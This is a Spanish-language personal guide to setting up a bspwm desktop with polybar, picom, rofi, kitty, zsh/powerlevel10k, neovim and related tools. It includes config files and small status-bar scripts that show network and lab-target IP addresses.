cd ~/Downloads 
git clone --recursive https://github.com/polybar/polybar
cd polybar 
mkdir build 
cd build 
cmake ..
make -j$(nproc)
sudo make install 

# EN CASO DE QUE HAYA ERRORES EN ALGUNO DE LOS COMANDOS ANTERIORES...
# OPCION DE INSTALACIÓN 2: 
sudo apt install polybar 
Copy<br><br><br>El Picom es una herramienta que nos permite jugar con difuminado, sombreado, transparencia, etc. de la pantalla. Mientras que Rofi es una herramienta que actua como buscador de archivos.<br># INSTALAR PICOM 
sudo apt install meson libxext-dev libxcb1-dev libxcb-damage0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render-util0-dev libxcb-render0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-xinerama0-dev libpixman-1-dev libdbus-1-dev libconfig-dev libgl1-mesa-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev libxcb-glx0-dev

cd ~/Downloads 
git clone https://github.com/ibhagwan/picom.git 
cd picom 
git submodule update --init --recursive 
meson --buildtype=release . build
ninja -c build 
sudo ninja -c build install 

# INSTALAR ROFI 
sudo apt install rofi 
# Configurarlo en el archivo ~/.config/sxhkd/sxhkdrc 
# super + d 
#   rofi -show run 
cd ~/Downloads/blue-sky
mkdir -p ~/.config/rofi/themes
cp nord.rasi ~/.config/rofi/themes
rofi-theme-selector 
# Seleccionamos nord
# Alt + a (Aplicar el cambio)
Copy<br><br><br><br>Para instalar las fuentes, nos dirigimos a <a rel="noopener nofollow" class="external-link" href="https://nerdfonts.com" target="_blank">https://nerdfonts.com</a> y descargamos la fuente de preferencia, en este caso <a data-tooltip-position="top" aria-label="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.0.2/Hack.zip" rel="noopener nofollow" class="external-link" href="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.0.2/Hack.zip" target="_blank">Hack Nerd Fonts</a><br>
<br>


<br># Una vez descargada la fuente
cd ~/Downloads
sudo mv Hack.zip /usr/local/share/fonts 
cd !$ 
sudo unzip Hack.zip
sudo rm Hack.zip
Copy<br>
<br>


<br>nano ~/.config/bspwm/bspwmrc
# Agregar linea:
# vmware-user-suid-wrapper &amp;
Copy<br>
<br>


<br>sudo apt install zsh 
sudo apt install zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete
sudo apt install imagemagick

cd ~/.config/kitty 
nano kitty.conf
nano color.ini

# Actualizar version par que funcione CTRL + SHIFT + Z
# Vamos al github de la kitty y nos descargamos en realeses el "Linux amd64 binary bundle"

wget https://github.com/kovidgoyal/kitty/releases/download/v0.28.1/kitty-0.28.1-x86_64.txz
Copy<br><br>enable_audio_bell no

include color.ini

font_family HackNerdFont
font_size 13

disable_ligatures never

url_color #61afef

url_style curly

map ctrl+left neighboring_window left
map ctrl+right neighboring_window right
map ctrl+up neighboring_window up
map ctrl+down neighboring_window down

map f1 copy_to_buffer a
map f2 paste_from_buffer a
map f3 copy_to_buffer b
map f4 paste_from_buffer b

cursor_shape beam
cursor_beam_thickness 1.8

mouse_hide_wait 3.0
detect_urls yes

repaint_delay 10
input_delay 3
sync_to_monitor yes

map ctrl+shift+z toggle_layout stack
tab_bar_style powerline

inactive_tab_background #e06c75
active_tab_background #98c379
inactive_tab_foreground #000000
tab_bar_margin_color black

map ctrl+shift+enter new_window_with_cwd
map ctrl+shift+t new_tab_with_cwd

background_opacity 0.95

shell zsh
Copy<br><br>cursor_shape          Underline
cursor_underline_thickness 1
window_padding_width  20

# Special
foreground #a9b1d6
background #1a1b26

# Black
color0 #414868
color8 #414868

# Red
color1 #f7768e
color9 #f7768e

# Green
color2  #73daca
color10 #73daca

# Yellow
color3  #e0af68
color11 #e0af68

# Blue
color4  #7aa2f7
color12 #7aa2f7

# Magenta
color5  #bb9af7
color13 #bb9af7

# Cyan
color6  #7dcfff
color14 #7dcfff

# White
color7  #c0caf5
color15 #c0caf5

# Cursor
cursor #c0caf5
cursor_text_color #1a1b26

# Selection highlight
selection_foreground #7aa2f7
selection_background #28344a
Copy<br><br>sudo cp /home/{username}/.config/kitty/* /root/.config/kitty
Copy<br><br><br><br>sudo apt install feh
echo "feh --bg-fill {path/image}.png &amp;" &gt;&gt; /home/{user}/.config/bspwm/bspwmrc
Copy<br><br><br><br>cd ~/Downloads 
git clone https://github.com/VaughnValle/blue-sky.git
cd blue-sky/polybar 
cp -r * ~/.config/polybar

# Configurar el despliegue de la polybar
echo '~/.config/polybar/./launch.sh' &gt;&gt; ~/.config/bspwm/bspwmrc

# Copiar las fuentes para poder utilizarlas en la polybar
cd ~/Downloads/blue-sky/polybar/fonts
sudo cp * /usr/share/fonts/truetype
fc-cache -v
Copy<br><br><br>mkdir ~/.config/picom 
cd !$ 
nano picom.conf

# Configurar el picom para el arranque
echo "picom &amp;" &gt;&gt; ~/.config/bspwm/bspwmrc
echo "bspc config border_width 0" &gt;&gt; ~/.config/bspwm/bspwmrc
Copy<br><br>##############################################################################
#                                  CORNERS                                   #
##############################################################################
# requires: https://github.com/sdhand/compton
corner-radius = 20;
rounded-corners-exclude = [
  #"window_type = 'normal'",
  #"class_g = 'firefox'",
];

round-borders = 20;
round-borders-exclude = [
  #"class_g = 'TelegramDesktop'",
];

# Specify a list of border width rules, in the format `PIXELS:PATTERN`, 
# Note we don't make any guarantee about possible conflicts with the
# border_width set by the window manager.
#
# example:
#    round-borders-rule = [ "2:class_g = 'URxvt'" ];
#
round-borders-rule = [];

##############################################################################
#                                  SHADOWS                                   #
##############################################################################

# Enabled client-side shadows on windows. Note desktop windows 
# (windows with '_NET_WM_WINDOW_TYPE_DESKTOP') never get shadow, 
# unless explicitly requested using the wintypes option.
#

# MODIFICAR EL SOMBREADO
shadow = false

# The blur radius for shadows, in pixels. (defaults to 12)
shadow-radius = 15

# The opacity of shadows. (0.0 - 1.0, defaults to 0.75)
shadow-opacity = .5

# The left offset for shadows, in pixels. (defaults to -15)
shadow-offset-x = -15

# The top offset for shadows, in pixels. (defaults to -15)
shadow-offset-y = -15

# Avoid drawing shadows on dock/panel windows. This option is deprecated,
# you should use the *wintypes* option in your config file instead.
#
# no-dock-shadow = false

# Don't draw shadows on drag-and-drop windows. This option is deprecated, 
# you should use the *wintypes* option in your config file instead.
#
# no-dnd-shadow = false

# Red color value of shadow (0.0 - 1.0, defaults to 0).
# shadow-red = .18

# Green color value of shadow (0.0 - 1.0, defaults to 0).
# shadow-green = .19

# Blue color value of shadow (0.0 - 1.0, defaults to 0).
# shadow-blue = .20

# Do not paint shadows on shaped windows. Note shaped windows 
# here means windows setting its shape through X Shape extension. 
# Those using ARGB background is beyond our control. 
# Deprecated, use 
#   shadow-exclude = 'bounding_shaped'
# or 
#   shadow-exclude = 'bounding_shaped &amp;&amp; !rounded_corners'
# instead.
#
# shadow-ignore-shaped = ''

# Specify a list of conditions of windows that should have no shadow.
#
# examples:
#   shadow-exclude = "n:e:Notification";
#
# shadow-exclude = []
shadow-exclude = [
    "class_g = 'firefox' &amp;&amp; argb"
];

# Specify a X geometry that describes the region in which shadow should not
# be painted in, such as a dock window region. Use 
#    shadow-exclude-reg = "x10+0+0"
# for example, if the 10 pixels on the bottom of the screen should not have shadows painted on.
#
# shadow-exclude-reg = "" 

# Crop shadow of a window fully on a particular Xinerama screen to the screen.
# xinerama-shadow-crop = false

##############################################################################
#                                  FADING                                    #
##############################################################################

# Fade windows in/out when opening/closing and when opacity changes,
#  unless no-fading-openclose is used.

# ANIMACION AL CERRAR Y ABRIR VENTANAS
#fading = true


# Opacity change between steps while fading in. (0.01 - 1.0, defaults to 0.028)
# fade-in-step = 0.028
fade-in-step = 0.01;

# Opacity change between steps while fading out. (0.01 - 1.0, defaults to 0.03)
# fade-out-step = 0.03
fade-out-step = 0.01;

# The time between steps in fade step, in milliseconds. (&gt; 0, defaults to 10)
# fade-delta = 10

# Specify a list of conditions of windows that should not be faded.
# fade-exclude = []

# Do not fade on window open/close.
# no-fading-openclose = false

# Do not fade destroyed ARGB windows with WM frame. Workaround of bugs in Openbox, Fluxbox, etc.
# no-fading-destroyed-argb = false

##############################################################################
#                                   OPACITY                                  #
##############################################################################

# Opacity of inactive windows. (0.1 - 1.0, defaults to 1.0)
inactive-opacity = 1.0

# Opacity of window titlebars and borders. (0.1 - 1.0, disabled by default)
frame-opacity = 1.0

# Default opacity for dropdown menus and popup menus. (0.0 - 1.0, defaults to 1.0)
opacity = 1.0

# Let inactive opacity set by -i override the '_NET_WM_OPACITY' values of windows.
# inactive-opacity-override = true
inactive-opacity-override = false;

# Default opacity for active windows. (0.0 - 1.0, defaults to 1.0)
active-opacity = 1.0

# Dim inactive windows. (0.0 - 1.0, defaults to 0.0)
# inactive-dim = 0.0

# Specify a list of conditions of windows that should always be considered focused.
# focus-exclude = []
focus-exclude = [ "class_g = 'Cairo-clock'" ];

# Use fixed inactive dim value, instead of adjusting according to window opacity.
# inactive-dim-fixed = 1.0

# Specify a list of opacity rules, in the format `PERCENT:PATTERN`, 
# like `50:name *= "Firefox"`. picom-trans is recommended over this. 
# Note we don't make any guarantee about possible conflicts with other 
# programs that set '_NET_WM_WINDOW_OPACITY' on frame or client windows.
# example:
#    opacity-rule = [ "80:class_g = 'URxvt'" ];
#
opacity-rule = [ "100:class_g = 'Firefox'" ];
# opacity-rule = [ "98:class_g = 'Polybar'" ]

##############################################################################
#                                    BLUR                                    #
##############################################################################

# Parameters for background blurring, see the *BLUR* section for more information.
blur-method = "dual_kawase"
blur-size = 1.5
blur-strength = 3

# Blur background of semi-transparent / ARGB windows. 
# Bad in performance, with driver-dependent behavior. 
# The name of the switch may change without prior notifications.
#

# FONDO BLUREADO 
blur-background = false


# Blur background of windows when the window frame is not opaque. 
# Implies:
#    blur-background 
# Bad in performance, with driver-dependent behavior. The name may change.
#
#blur-background-frame = false


# Use fixed blur strength rather than adjusting according to window opacity.
#blur-background-fixed = false


# Specify the blur convolution kernel, with the following format:
# example:
#   blur-kern = "5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1";
#
# blur-kern = ''
# blur-kern = "3x3box";

# Exclude conditions for background blur.
# blur-background-exclude = []
#blur-background-exclude = [
#    "! name~=''",
#    "name *= 'slop'",
#    "window_type = 'dock'",
#    "window_type = 'desktop'",
#    "_GTK_FRAME_EXTENTS@:c"
#];

##############################################################################
#                                    GENERAL                                 #
##############################################################################

# Daemonize process. Fork to background after initialization. Causes issues with certain (badly-written) drivers.
# daemon = false

# Specify the backend to use: `xrender`, `glx`, or `xr_glx_hybrid`.
# `xrender` is the default one.
#
# backend = 'glx'
backend = "glx";

# Enable/disable VSync.
# vsync = false
vsync = false

# Enable remote control via D-Bus. See the *D-BUS API* section below for more details.
# dbus = false

# Try to detect WM windows (a non-override-redirect window with no 
# child that has 'WM_STATE') and mark them as active.
#
# mark-wmwin-focused = false
mark-wmwin-focused = true;

# Mark override-redirect windows that doesn't have a child window with 'WM_STATE' focused.
# mark-ovredir-focused = false
mark-ovredir-focused = true;

# Try to detect windows with rounded corners and don't consider them 
# shaped windows. The accuracy is not very high, unfortunately.
#
# detect-rounded-corners = false
detect-rounded-corners = true;

# Detect '_NET_WM_OPACITY' on client windows, useful for window managers
# not passing '_NET_WM_OPACITY' of client windows to frame windows.
#
# detect-client-opacity = false
detect-client-opacity = true;

# Specify refresh rate of the screen. If not specified or 0, picom will 
# try detecting this with X RandR extension.
#
# refresh-rate = 60
refresh-rate = 0

# Limit picom to repaint at most once every 1 / 'refresh_rate' second to 
# boost performance. This should not be used with 
#   vsync drm/opengl/opengl-oml
# as they essentially does sw-opti's job already, 
# unless you wish to specify a lower refresh rate than the actual value.
#
# sw-opti = 

# Use EWMH '_NET_ACTIVE_WINDOW' to determine currently focused window, 
# rather than listening to 'FocusIn'/'FocusOut' event. Might have more accuracy, 
# provided that the WM supports it.
#
# use-ewmh-active-win = false

# Unredirect all windows if a full-screen opaque window is detected, 
# to maximize performance for full-screen windows. Known to cause flickering 
# when redirecting/unredirecting windows.
#
# unredir-if-possible = false

# Delay before unredirecting the window, in milliseconds. Defaults to 0.
# unredir-if-possible-delay = 0

# Conditions of windows that shouldn't be considered full-screen for unredirecting screen.
# unredir-if-possible-exclude = []

# Use 'WM_TRANSIENT_FOR' to group windows, and consider windows 
# in the same group focused at the same time.
#
# detect-transient = false
detect-transient = true

# Use 'WM_CLIENT_LEADER' to group windows, and consider windows in the same 
# group focused at the same time. 'WM_TRANSIENT_FOR' has higher priority if 
# detect-transient is enabled, too.
#
# detect-client-leader = false
detect-client-leader = true

# Resize damaged region by a specific number of pixels. 
# A positive value enlarges it while a negative one shrinks it. 
# If the value is positive, those additional pixels will not be actually painted 
# to screen, only used in blur calculation, and such. (Due to technical limitations, 
# with use-damage, those pixels will still be incorrectly painted to screen.) 
# Primarily used to fix the line corruption issues of blur, 
# in which case you should use the blur radius value here 
# (e.g. with a 3x3 kernel, you should use `--resize-damage 1`, 
# with a 5x5 one you use `--resize-damage 2`, and so on). 
# May or may not work with *--glx-no-stencil*. Shrinking doesn't function correctly.
#
# resize-damage = 1

# Specify a list of conditions of windows that should be painted with inverted color. 
# Resource-hogging, and is not well tested.
#
# invert-color-include = []

# GLX backend: Avoid using stencil buffer, useful if you don't have a stencil buffer. 
# Might cause incorrect opacity when rendering transparent content (but never 
# practically happened) and may not work with blur-background. 
# My tests show a 15% performance boost. Recommended.
#
# glx-no-stencil = false

# GLX backend: Avoid rebinding pixmap on window damage. 
# Probably could improve performance on rapid window content changes, 
# but is known to break things on some drivers (LLVMpipe, xf86-video-intel, etc.).
# Recommended if it works.
#
# glx-no-rebind-pixmap = false

# Disable the use of damage information. 
# This cause the whole screen to be redrawn everytime, instead of the part of the screen
# has actually changed. Potentially degrades the performance, but might fix some artifacts.
# The opposing option is use-damage
#
# no-use-damage = false
use-damage = false

# Use X Sync fence to sync clients' draw calls, to make sure all draw 
# calls are finished before picom starts drawing. Needed on nvidia-drivers 
# with GLX backend for some users.
#
# xrender-sync-fence = false

# GLX backend: Use specified GLSL fragment shader for rendering window contents. 
# See `compton-default-fshader-win.glsl` and `compton-fake-transparency-fshader-win.glsl` 
# in the source tree for examples.
#
# glx-fshader-win = ''

# Force all windows to be painted with blending. Useful if you 
# have a glx-fshader-win that could turn opaque pixels transparent.
#
# force-win-blend = false

# Do not use EWMH to detect fullscreen windows. 
# Reverts to checking if a window is fullscreen based only on its size and coordinates.
#
# no-ewmh-fullscreen = false

# Dimming bright windows so their brightness doesn't exceed this set value. 
# Brightness of a window is estimated by averaging all pixels in the window, 
# so this could comes with a performance hit. 
# Setting this to 1.0 disables this behaviour. Requires --use-damage to be disabled. (default: 1.0)
#
# max-brightness = 1.0

# Make transparent windows clip other windows like non-transparent windows do,
# instead of blending on top of them.
#
# transparent-clipping = false

# Set the log level. Possible values are:
#  "trace", "debug", "info", "warn", "error"
# in increasing level of importance. Case doesn't matter. 
# If using the "TRACE" log level, it's better to log into a file 
# using *--log-file*, since it can generate a huge stream of logs.
#
# log-level = "debug"
log-level = "warn";

# Set the log file.
# If *--log-file* is never specified, logs will be written to stderr. 
# Otherwise, logs will to written to the given file, though some of the early 
# logs might still be written to the stderr. 
# When setting this option from the config file, it is recommended to use an absolute path.
#
# log-file = '/path/to/your/log/file'

# Show all X errors (for debugging)
# show-all-xerrors = false

# Write process ID to a file.
# write-pid-path = '/path/to/your/log/file'

# Window type settings
# 
# 'WINDOW_TYPE' is one of the 15 window types defined in EWMH standard: 
#     "unknown", "desktop", "dock", "toolbar", "menu", "utility", 
#     "splash", "dialog", "normal", "dropdown_menu", "popup_menu", 
#     "tooltip", "notification", "combo", and "dnd".
# 
# Following per window-type options are available: ::
# 
#   fade, shadow:::
#     Controls window-type-specific shadow and fade settings.
# 
#   opacity:::
#     Controls default opacity of the window type.
# 
#   focus:::
#     Controls whether the window of this type is to be always considered focused. 
#     (By default, all window types except "normal" and "dialog" has this on.)
# 
#   full-shadow:::
#     Controls whether shadow is drawn under the parts of the window that you 
#     normally won't be able to see. Useful when the window has parts of it 
#     transparent, and you want shadows in those areas.
# 
#   redir-ignore:::
#     Controls whether this type of windows should cause screen to become 
#     redirected again after been unredirected. If you have unredir-if-possible
#     set, and doesn't want certain window to cause unnecessary screen redirection, 
#     you can set this to `true`.
#
wintypes:
{
  tooltip = { fade = true; shadow = true; shadow-radius = 0; shadow-opacity = 1.0; shadow-offset-x = -20; shadow-offset-y = -20; opacity = 0.8; full-shadow = true; }; 
  dnd = { shadow = false; }
  dropdown_menu = { shadow = false; };
  popup_menu    = { shadow = false; };
  utility       = { shadow = false; };
}
Copy<br><br><br>git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
echo 'source ~/powerlevel10k/powerlevel10k.zsh-theme' &gt;&gt;~/.zshrc

zsh 
# A partir de aca configurar la barra como querramos

nano /home/{user}/.p10k.zsh
# Aqui comentamos todo lo que este dentro de los () de POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS
# Y agregamos en POWERLEVEL9K_LEFT_PROMPT_ELEMENTS
context
command_execution_time
status

# Configuración para root
sudo su 
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
echo 'source ~/powerlevel10k/powerlevel10k.zsh-theme' &gt;&gt;~/.zshrc
zsh 
# CTRL + C 
compaudit
# Completar la instalación 
chown root:root /usr/local/share/zsh/site-functions/_bspc
usermod --shell /usr/bin/zsh root 
usermod --shell /usr/bin/zsh {user}
ln -s -f /home/{user}/.zshrc /root/.zshrc
# Modificamos en la .zshrc la línea source ~/powerlevel10k..... por /home/{user}/powerlevel10k......
nano /root/.p10k.zsh
# Volvemos a quitar todo lo que este dentro de los () de POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS
# Y agregamos en POWERLEVEL9K_LEFT_PROMPT_ELEMENTS
context
command_execution_time
status
# Y DE MANERA ADICIONAL PARA DIFERENCIAR AL USUARIO ROOT DONDE PONE 
# typeset -g POWERLEVEL9K_CONTEXT_ROOT_TEMPLATE='%B%n@%m'
# Podemos remplazar %B%n@%m por un icono de HackNerdFonts
# Y dejar vacio donde dice typeset -g POWERLEVEL9K_CONTEXT_PREFIX=''

# Si tenemos problemas para copiar el icono, copiamos el valor hexadecimal del mismo, tocamos CTRL + SHIFT + U, pegamos el codigo hexadecimal y nos devuelve el icono. 

# Lo sig. al ~/.zshrc
setopt histignorealldups sharehistory 
# Quitar del ~/.zshr lo sig: 
#if [ -f /usr/share/zsh-autocomplete/zsh-autocomplete.plugin.zsh ]; then
 # source /usr/share/zsh-autocomplete/zsh-autocomplete.plugin.zsh
  # Select all suggestion instead of top on result only
  #zstyle ':autocomplete:tab:*' insert-unambiguous yes
  #zstyle ':autocomplete:tab:*' widget-style menu-select
  #zstyle ':autocomplete:*' min-input 2
  #bindkey $key[Up] up-line-or-history
 # bindkey $key[Down] down-line-or-history
 #fi 

# Setear en false la línea:
typeset -g POWERLEVEL9K_DIR_ANCHOR_BOLD=true 

# Agregar al ~.zshrc 
# Use modern completion system
autoload -Uz compinit
compinit
 
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' menu select=long
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
 
zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'
Copy<br><br>Por un lado descargamos los plugins para mejorar comandos basicos como ls y cat. Por un lado descargamos <a data-tooltip-position="top" aria-label="https://github.com/sharkdp/bat/releases" rel="noopener nofollow" class="external-link" href="https://github.com/sharkdp/bat/releases" target="_blank">batcat</a> y por otro <a data-tooltip-position="top" aria-label="https://github.com/lsd-rs/lsd/releases" rel="noopener nofollow" class="external-link" href="https://github.com/lsd-rs/lsd/releases" target="_blank">lsd</a>. <br># Esc + Esc = sudo {command}
sudo cd /usr/share
sudo mkdir zsh-sudo 
sudo chown {user}:{user} zsh-sudo
cd zsh-sudo 
wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/sudo/sudo.plugin.zsh
chmod +x sudo.plugin.zsh
echo "if [ -f /usr/share/zsh-sudo/sudo.plugin.zsh ]; then
	source /usr/share/zsh-sudo/sudo.plugin.zsh
fi" &gt;&gt; ~/.zshrc

# Localizar archivos del sistema rapidamente
apt install locate 
# Sincronizar los archivos del sistema
updatedb 
# unmount /run/user/1000/doc

# Quitar la negrita del lsd de la variable del
echo $LS_COLORS
cat ~/.zshrc 
# LS_COLORS Decalaration 
export LS_COLORS="rs=0:di=34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.
tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;3
1:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;
31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm
=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=0
1;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;
35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.fl
v=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*
.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:
*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;9
0:*.rpmsave=00;90:"
# Sacar los 01; de las extensiones para quitar negrita

# Pegar en la ~/.zshrc 
# Custom Aliases
# -----------------------------------------------
# bat
alias cat='bat'
alias catn='bat --style=plain'
alias catnp='bat --style=plain --paging=never'
 
# ls
alias ll='lsd -lh --group-dirs=first'
alias la='lsd -a --group-dirs=first'
alias l='lsd --group-dirs=first'
alias lla='lsd -lha --group-dirs=first'
alias ls='lsd --group-dirs=first'
Copy<br>
<br>


<br># Solucionar error de java 

# En el ~/.zhrc
export _JAVA_AWT_WM_NONREPARENTING=1

# En el ~/.config/bspwm/bspmrc 
wmname LG3D &amp; 
Copy<br>
<br>


<br>xrandr --output Virtual1 1920x1080
Copy<br><br><br> Para modificar las barras que se verán en la parte de arriba del entorno.<br># En el archivo ~/.config/polybar/launch.sh se cargan los modulos (las barras con iconos)
# En el archivo color.ini modificamos esos modulos, creamos lo que querramos (Settarget, hackthebox)
Copy<br><br>font-7 = "Hack Nerd Font Mono:style=medium:pixelsize=40;10"
Copy<br><br>#!/usr/bin/env sh

## Add this to your wm startup file.

# Terminate already running bar instances
killall -q polybar

## Wait until the processes have been shut down
while pgrep -u $UID -x polybar &gt;/dev/null; do sleep 1; done

## Launch

## Left bar
polybar log -c ~/.config/polybar/current.ini &amp;
polybar ethernet_bar -c ~/.config/polybar/current.ini &amp;
polybar vpn_bar -c ~/.config/polybar/current.ini &amp;

## Right bar
polybar primary -c ~/.config/polybar/current.ini &amp;
#polybar top -c ~/.config/polybar/current.ini &amp;
polybar target_bar -c ~/.config/polybar/current.ini &amp;

## Center bar
polybar primary -c ~/.config/polybar/workspace.ini &amp;
Copy<br>Como vemos en el archiov launch.sh se estan intentando cargar barras como ethernet_bar, target_bar, vpn_bar, los cuales hay que crear en el archivo current.ini<br>[bar/ethernet_bar]
inherit = bar/main
width = 10%
height = 40
offset-x = 3.8%
offset-y = 15
background = ${color.bg}
foreground = ${color.white}
bottom = false
padding = 1
;padding-top = 2
module-margin-left = 0
module-margin-right = 0
;modules-left = date sep mpd
modules-center = ethernet_status
wm-restack = bspwm

[bar/vpn_bar]
inherit = bar/main
width = 10%
height = 40
offset-x = 14.05%
offset-y = 15
background = ${color.bg}
foreground = ${color.white}
bottom = false
padding = 1
;padding-top = 2
module-margin-left = 0
module-margin-right = 0
;modules-left = date sep mpd
modules-center = vpn_status
wm-restack = bspwm


[bar/target_bar]
inherit = bar/main
offset-x = 79.1%
offset-y = 15
width = 16.1%
height = 40
bottom = false
padding = 0
module-margin-left = 0
module-margin-right = 0
background = ${color.bg}
;foreground = ${color.blue}
foreground = #44abff
;modules-center = web sep2 files sep2 edit sep2 apps
modules-center = target_status
wm-restack = bspwm
Copy<br>A su vez vemos que estas barras estan intentando cargar modulos como ethernet_status, vpn_status y target_status, por lo que también hay que crearlos: <br>[module/ethernet_status]
type = custom/script
interval = 2
exec = ~/.config/polybar/bin/ethernet_status.sh

[module/vpn_status]
type = custom/script
interval = 2
exec = ~/.config/polybar/bin/vpn_status.sh


[module/target_status]
type = custom/script
interval = 2
exec = ~/.config/polybar/bin/target_status.sh
Copy<br>Por lo que una vez más vemos que estos modulos están declarandose como scripts customizados que se ejecutaran en un intervalo regular de tiempo cada 2 segundos en una ruta especifa, en dichos archivos debería estar creado los 3 archivos: <br><br>#!/bin/bash

echo -e "%{F#2495e7}󰈀 %{F#ffffff}$(/usr/bin/hostname -I | /usr/bin/awk '{print $1}')"
Copy<br><br>#!/bin/bash

ip=$(/usr/sbin/ifconfig | /usr/bin/grep -C 1 tun0 | /usr/bin/tail -n 1 | /usr/bin/awk '{print $2}')

[[ $ip ]] &amp;&amp; echo "%{F#09d304}󱛇 $ip%{F#ffffff}" || echo "%{F#d93753}󱛇 Disconnected.%{F#ffffff}"
Copy<br><br>#!/bin/bash

ip=$(/usr/bin/cat ~/.config/polybar/bin/target | /usr/bin/awk '{print $1}')
name=$(/usr/bin/cat ~/.config/polybar/bin/target | /usr/bin/awk '{print $2}')

[[ $ip ]] &amp;&amp; echo "%{F#d93753}󰓾%{F#ffffff} $ip - $name" || echo "%{F#d93753}󰓾 NO TARGET%{F#ffffff}"

Copy<br><br>cd ~/.config/polybar/bin
tocuh target

echo 'function settarget(){
	ip_address=$1
	machine_name=$2
	echo $ip_address $machine_name &gt; /home/kali/.config/polybar/bin/target
}' &gt;&gt; ~/.zshrc 

chmod +x ~/.config/polybar/bin/*
Copy<br><br><br>cd ~/.config/nvim 
rm -r * 
git clone https://github.com/NvChad/NvChad ~/.config/nvim --depth 1 

sudo su 
cd /opt
wget https://github.com/neovim/neovim/releases/download/stable/nvim-linux64.tar.gz
tar -xf nvim-linux64.tar.gz

/opt/nvim-linux64/bin/./nvim
# Seleccionar 'N'

# sudo apt remove neovim 
# Modificar $PATH con la ruta /opt/nvim-linux64/bin:

# Eliminar auto completado de nvim 
nano ~/.config/nvim/lua/plugins/init.lua
# Filtrar por cmp y eliminar dedsde la línea 153 (-- load luasnips + cmp....) hasta la línea 199 donde comienza (numToStr/Comment.nvim)

:NvimTreeToggle

sudo su 
cd ~/.config
rm -rf nvim 
cp -r /home/{user}/.config/nvim . 

Copy<br><br><br><br># Flamshot y ranger
sudo apt install flameshot ranger
echo "/usr/bin/flameshot" &gt;&gt; ~/.config/sxhkd/sxhkdrc
# i3lock
cd ~/Downloads
git clone https://github.com/meskarune/i3lock-fancy
cd i3locl-fancy
sudo make install 
echo "$(pwd)/i3lock-fancy" &gt;&gt; ~/.config/sxhkd/sxh
# FZF
git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install
# Ahora con Ctrl + t podemos ver los dirs y Ctrl + r movernos por le history  
